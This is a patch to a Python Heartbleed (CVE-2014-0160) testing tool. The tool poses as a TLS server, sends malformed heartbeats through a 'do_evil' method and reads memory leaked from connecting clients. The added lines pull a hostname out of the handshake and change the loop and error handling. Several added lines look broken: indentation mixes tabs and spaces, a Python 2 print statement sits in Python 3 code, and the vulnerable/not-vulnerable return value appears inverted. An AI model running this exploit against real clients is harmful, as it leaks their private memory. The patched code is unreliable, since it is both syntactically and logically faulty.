@@ -11,6 +11,8 @@ import socket
 import sys
 import struct
 import select, time
+import string
+import re
 from argparse import ArgumentParser
 
 parser = ArgumentParser(description='Test clients for Heartbleed (CVE-2014-0160)')
@@ -100,14 +102,17 @@ class RequestHandler(socketserver.BaseRequestHandler):
 
             for i in range(0, self.args.count):
                 try:
-                    self.do_evil()
+                    vuln = self.do_evil()
+                    if not vuln:
+                        break
                 except OSError as e:
                     if i == 0: # First heartbeat?
                         print('Unable to send first heartbeat! ' + str(e))
                     else:
                         print('Unable to send more heartbeats, ' + str(e))
                     break
-        except (Failure, OSError, socket.timeout) as e:
+        #except (Failure, OSError, socket.timeout) as e:
+        except Exception as e:
             print('Unable to check for vulnerability: ' + str(e))
         except KeyboardInterrupt:
             # Don't just abort this client, stop the server too
@@ -142,6 +147,11 @@ class RequestHandler(socketserver.BaseRequestHandler):
         # The first cipher is fine...
         cipher = bytearray(hnd[off:off+2])
 
+	handshake_strings = re.findall('[a-zA-Z0-9\.-]{8,}',hnd)
+	#handshake_strings = strings(hnd,8)
+        if len(handshake_strings) > 0:
+            print 'Hostname: {}'.format(handshake_strings[0])
+
         self.sslver = '{:02x} {:02x}'.format(ver >> 8, ver & 0xFF)
 
         # (1) Handshake: ServerHello
@@ -156,6 +166,9 @@ class RequestHandler(socketserver.BaseRequestHandler):
         # (3) Buggy OpenSSL will throw 0xffff bytes, fixed ones stay silent
         if not self.read_memory(self.request, self.args.timeout):
             print("Possibly not vulnerable")
+            return True
+        else:
+            return False
 
     def read_memory(self, sock, timeout):
         end_time = time.time() + timeout
